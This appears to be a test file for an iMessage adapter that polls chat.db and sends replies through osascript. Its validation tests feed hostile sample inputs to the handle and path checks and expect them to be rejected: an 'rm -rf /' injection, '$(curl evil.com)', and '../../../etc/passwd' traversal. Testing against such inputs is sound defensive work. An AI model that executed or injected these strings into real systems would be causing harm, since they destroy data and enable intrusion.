import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";

import { buildFixtureChatDb } from "./fixtures/build-chat-db";
import {
  IMessageAdapterError,
  type OsascriptSpawn,
  _internal,
  createIMessageAdapter,
  runOsascript,
} from "./index";

const { isSafeHandle, escapeAppleScriptString, validateChatDbPath } = _internal;

/**
 * Build a deterministic fake of `child_process.spawn` for {@link runOsascript}
 * tests — no real process. `behavior` decides which lifecycle events fire and
 * is invoked on a microtask so the runner has wired its listeners first.
 */
function fakeSpawn(behavior: {
  readonly stderrChunks?: readonly string[];
  readonly closeCode?: number | null;
  readonly emitError?: Error;
  /** Force `stdin`/`stderr` to be null to exercise the optional-chaining guards. */
  readonly nullStreams?: boolean;
}): { spawn: OsascriptSpawn; getWritten: () => string | undefined; ended: () => boolean } {
  let written: string | undefined;
  let didEnd = false;
  const spawn: OsascriptSpawn = (command, args, options) => {
    // The runner must always invoke osascript reading the script from stdin.
    expect(command).toBe("osascript");
    expect(args).toEqual(["-"]);
    expect(options).toEqual({ stdio: ["pipe", "ignore", "pipe"] });
    const handlers: Record<string, (arg: never) => void> = {};
    const stderrHandlers: ((chunk: Buffer) => void)[] = [];
    queueMicrotask(() => {
      for (const c of behavior.stderrChunks ?? []) {
        for (const h of stderrHandlers) h(Buffer.from(c, "utf8"));
      }
      if (behavior.emitError) handlers["error"]?.(behavior.emitError as never);
      else handlers["close"]?.((behavior.closeCode ?? 0) as never);
    });
    return {
      stderr: behavior.nullStreams ? null : { on: (_e, cb) => stderrHandlers.push(cb) },
      stdin: behavior.nullStreams
        ? null
        : {
            write: (chunk: string) => {
              written = chunk;
            },
            end: () => {
              didEnd = true;
            },
          },
      on: (event: string, cb: (arg: never) => void) => {
        handlers[event] = cb;
      },
    };
  };
  return { spawn, getWritten: () => written, ended: () => didEnd };
}

describe("runOsascript (default-runner core, dependency-injected spawn)", () => {
  test("writes the script to stdin and resolves on exit code 0", async () => {
    const f = fakeSpawn({ closeCode: 0 });
    await runOsascript(f.spawn, "tell app");
    expect(f.getWritten()).toBe("tell app");
    expect(f.ended()).toBe(true);
  });

  test("rejects with stderr text + code on a non-zero exit", async () => {
    const f = fakeSpawn({ closeCode: 2, stderrChunks: ["bad ", "things"] });
    await expect(runOsascript(f.spawn, "x")).rejects.toThrow(/osascript exited with 2: bad things/);
  });

  test("rejects with a clear message when spawn emits 'error'", async () => {
    const boom = new Error("ENOENT osascript");
    const f = fakeSpawn({ emitError: boom });
    let caught: unknown;
    try {
      await runOsascript(f.spawn, "x");
    } catch (e) {
      caught = e;
    }
    expect(caught).toBeInstanceOf(IMessageAdapterError);
    expect((caught as Error).message).toBe("osascript spawn failed");
    // The originating error is preserved on the cause chain.
    expect((caught as IMessageAdapterError).cause).toBe(boom);
  });

  test("null stdin/stderr streams are tolerated (optional-chaining guards)", async () => {
    const f = fakeSpawn({ nullStreams: true, closeCode: 0 });
    await runOsascript(f.spawn, "x");
    // Nothing was written because stdin was null; the runner still resolved.
    expect(f.getWritten()).toBeUndefined();
  });

  test("exposed on _internal for the adapter's wiring", () => {
    expect(_internal.runOsascript).toBe(runOsascript);
  });
});

describe("isSafeHandle / escapeAppleScriptString / validateChatDbPath", () => {
  test("accepts well-formed iMessage handles", () => {
    expect(isSafeHandle("alice@example.com")).toBe(true);
    expect(isSafeHandle("+15551234567")).toBe(true);
    expect(isSafeHandle("tel:+15551234567")).toBe(true);
  });

  test("rejects shell-injection-shaped handles", () => {
    expect(isSafeHandle('alice@example.com";rm -rf /')).toBe(false);
    expect(isSafeHandle("$(curl evil.com)")).toBe(false);
    expect(isSafeHandle("../../../etc/passwd")).toBe(false);
    expect(isSafeHandle("")).toBe(false);
  });

  test("escapes AppleScript metacharacters", () => {
    expect(escapeAppleScriptString('hi "you"')).toBe('hi \\"you\\"');
    expect(escapeAppleScriptString("path\\to\\file")).toBe("path\\\\to\\\\file");
    expect(escapeAppleScriptString("line1\nline2")).toBe("line1\\nline2");
  });

  test("validateChatDbPath requires chat.db filename and rejects empty", () => {
    expect(() => validateChatDbPath("")).toThrow(/chat.db path is empty/);
    expect(() => validateChatDbPath("/etc/passwd")).toThrow(/must end in 'chat.db'/);
    expect(validateChatDbPath("/tmp/some/chat.db")).toBe("/tmp/some/chat.db");
  });
});

describe("createIMessageAdapter — opt-in guard (T8)", () => {
  test("requireHostOptIn=false bypasses guards (test mode)", () => {
    const dbPath = buildFixtureChatDb();
    const cursorPath = join(dirname(dbPath), "cursor.json");
    const a = createIMessageAdapter({
      chatDbPath: dbPath,
      cursorPath,
      requireHostOptIn: false,
    });
    expect(a.id).toBe("imessage");
  });

  test("missing chat.db throws clear error", () => {
    expect(() =>
      createIMessageAdapter({
        chatDbPath: join(tmpdir(), "definitely-missing", "chat.db"),
        requireHostOptIn: false,
      }),
    ).toThrow(/chat.db not found/);
  });
});

describe("pollNewMessages (T2)", () => {
  let dbPath: string;
  let cursorPath: string;
  let adapter: ReturnType<typeof createIMessageAdapter>;

  beforeAll(() => {
    dbPath = buildFixtureChatDb();
    cursorPath = join(dirname(dbPath), "cursor.json");
    adapter = createIMessageAdapter({
      chatDbPath: dbPath,
      cursorPath,
      requireHostOptIn: false,
    });
  });

  afterAll(() => {
    rmSync(dirname(dbPath), { recursive: true, force: true });
  });

  test("first poll returns 3 inbound (skips me + empty), advances cursor to ROWID 5", async () => {
    const r = await adapter.pollNewMessages();
    expect(r.events.length).toBe(3);
    expect(r.cursor).toBe(5);
    expect(r.events[0]?.idempotencyKey).toBe("imsg:1");
    expect(r.events[0]?.text).toBe("first inbound from alice");
    expect(r.events[0]?.userId).toBe("alice@example.com");
    expect(r.events[0]?.channelId).toBe("alice@example.com");
    expect(r.events[1]?.idempotencyKey).toBe("imsg:3");
    expect(r.events[1]?.userId).toBe("+15551234567");
    expect(r.events[2]?.idempotencyKey).toBe("imsg:5");
  });

  test("subsequent poll with no new rows returns empty + same cursor", async () => {
    const first = await adapter.pollNewMessages();
    const second = await adapter.pollNewMessages();
    expect(second.events.length).toBe(0);
    expect(second.cursor).toBe(first.cursor);
  });

  test("cursor persists across new adapter instances (idempotency across restart)", async () => {
    // First adapter polls and advances cursor.
    await adapter.pollNewMessages();
    // Construct a fresh adapter pointing at the same cursor file.
    const a2 = createIMessageAdapter({
      chatDbPath: dbPath,
      cursorPath,
      requireHostOptIn: false,
    });
    const r = await a2.pollNewMessages();
    expect(r.events.length).toBe(0);
    expect(a2.getCursor()).toBe(5);
  });

  test("resetCursor clears the persisted state", async () => {
    adapter.resetCursor();
    expect(adapter.getCursor()).toBe(0);
    const r = await adapter.pollNewMessages();
    expect(r.events.length).toBe(3);
  });
});

describe("sendReply (T3)", () => {
  test("escapes message text + handle, hits osascript with the right script", async () => {
    const dbPath = buildFixtureChatDb();
    const cursorPath = join(dirname(dbPath), "cursor.json");
    const calls: string[] = [];
    const a = createIMessageAdapter(
      {
        chatDbPath: dbPath,
        cursorPath,
        requireHostOptIn: false,
      },
      {
        osascript: async (script) => {
          calls.push(script);
        },
      },
    );
    await a.sendReply({
      event: {
        idempotencyKey: "imsg:1",
        workspaceId: "imessage",
        channelId: "alice@example.com",
        userId: "alice@example.com",
        ts: "0",
        text: "hello",
        subtype: "message",
      },
      text: 'reply with "quotes"',
    });
    expect(calls.length).toBe(1);
    const script = calls[0] ?? "";
    expect(script).toContain('tell application "Messages"');
    expect(script).toContain('buddy "alice@example.com"');
    expect(script).toContain('send "reply with \\"quotes\\""');
    rmSync(dirname(dbPath), { recursive: true, force: true });
  });

  test("rejects shell-injection in handle (path-traversal / metachar guard)", async () => {
    const dbPath = buildFixtureChatDb();
    const cursorPath = join(dirname(dbPath), "cursor.json");
    const a = createIMessageAdapter(
      { chatDbPath: dbPath, cursorPath, requireHostOptIn: false },
      { osascript: async () => undefined },
    );
    await expect(
      a.sendReply({
        event: {
          idempotencyKey: "x",
          workspaceId: "imessage",
          channelId: 'alice"; do bad`',
          userId: 'alice"; do bad`',
          ts: "0",
          text: "x",
          subtype: "message",
        },
        text: "x",
      }),
    ).rejects.toThrow(/unsafe iMessage handle/);
    rmSync(dirname(dbPath), { recursive: true, force: true });
  });
});

describe("setTyping is a no-op", () => {
  test("does not throw or call osascript", async () => {
    const dbPath = buildFixtureChatDb();
    const cursorPath = join(dirname(dbPath), "cursor.json");
    let called = false;
    const a = createIMessageAdapter(
      { chatDbPath: dbPath, cursorPath, requireHostOptIn: false },
      {
        osascript: async () => {
          called = true;
        },
      },
    );
    await a.setTyping({
      event: {
        idempotencyKey: "x",
        workspaceId: "imessage",
        channelId: "alice@example.com",
        userId: "alice@example.com",
        ts: "0",
        text: "",
        subtype: "message",
      },
    });
    expect(called).toBe(false);
    rmSync(dirname(dbPath), { recursive: true, force: true });
  });
});

describe("verify / parseInbound (no-op for poll-driven adapter)", () => {
  test("verify returns true; parseInbound returns skip", () => {
    const dbPath = buildFixtureChatDb();
    const cursorPath = join(dirname(dbPath), "cursor.json");
    const a = createIMessageAdapter({
      chatDbPath: dbPath,
      cursorPath,
      requireHostOptIn: false,
    });
    expect(a.verify({ headers: new Headers(), body: "" })).toBe(true);
    expect(a.parseInbound({ headers: new Headers(), body: "{}" }).kind).toBe("skip");
    rmSync(dirname(dbPath), { recursive: true, force: true });
  });
});

describe("cursor file integrity", () => {
  test("malformed cursor file falls back to 0", () => {
    const dbPath = buildFixtureChatDb();
    const cursorPath = join(dirname(dbPath), "cursor.json");
    writeFileSync(cursorPath, "not json{");
    const a = createIMessageAdapter({
      chatDbPath: dbPath,
      cursorPath,
      requireHostOptIn: false,
    });
    expect(a.getCursor()).toBe(0);
    rmSync(dirname(dbPath), { recursive: true, force: true });
  });

  test("cursor file written with 0o600 mode", async () => {
    const dbPath = buildFixtureChatDb();
    const cursorPath = join(dirname(dbPath), "cursor.json");
    const a = createIMessageAdapter({
      chatDbPath: dbPath,
      cursorPath,
      requireHostOptIn: false,
    });
    await a.pollNewMessages();
    if (existsSync(cursorPath)) {
      const { statSync } = await import("node:fs");
      const mode = statSync(cursorPath).mode & 0o777;
      // On Bun/Linux the umask may downgrade — accept anything <= 0o600.
      expect(mode <= 0o600).toBe(true);
    }
    expect(JSON.parse(readFileSync(cursorPath, "utf8"))).toEqual({ cursor: 5 });
    rmSync(dirname(dbPath), { recursive: true, force: true });
  });
});
